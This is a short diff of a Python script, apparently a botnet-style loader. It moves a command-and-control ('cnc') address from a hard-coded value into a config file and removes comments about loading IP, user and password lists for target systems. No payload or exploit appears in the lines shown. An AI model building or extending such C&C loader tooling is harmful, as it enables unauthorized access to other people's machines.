@@ -15,11 +15,21 @@ logging.basicConfig(filename="../../logs/loader.log",
 #Creating an object 
 logger=logging.getLogger() 
   
-#Setting the threshold of logger to DEBUG 
+#Setting the threshold of logger to DEBUG
+ip = "127.0.0.1"
+port = "5000" 
 logger.setLevel(logging.DEBUG) 
-#run this script every 10 seconds or so
-#get ip user password that are not loaded yet from db, currently from file
-cnc = "http://192.168.1.18:5000"
+with open("../../.config","r") as f:
+    for line in f:
+        k,v=line.strip().split("=")
+        k = k.strip()
+        v = v.strip()
+        if(k=="cnc"):
+            ip = v
+        elif(k=="port"):
+            port = v
+
+cnc = "http://"+ip+":"+port
 
 def randomFileName(stringLength=10):
     """Generate a random string of fixed length """
@@ -34,11 +44,6 @@ def execute(cmd):
     return_code = popen.wait()
     if return_code:
         raise subprocess.CalledProcessError(return_code, cmd)
-    
-# systems = []
-# with open("ips.txt","r") as f:
-#     for line in f:
-#         systems.append(line.strip().split(","))
 
 
 def load(system):
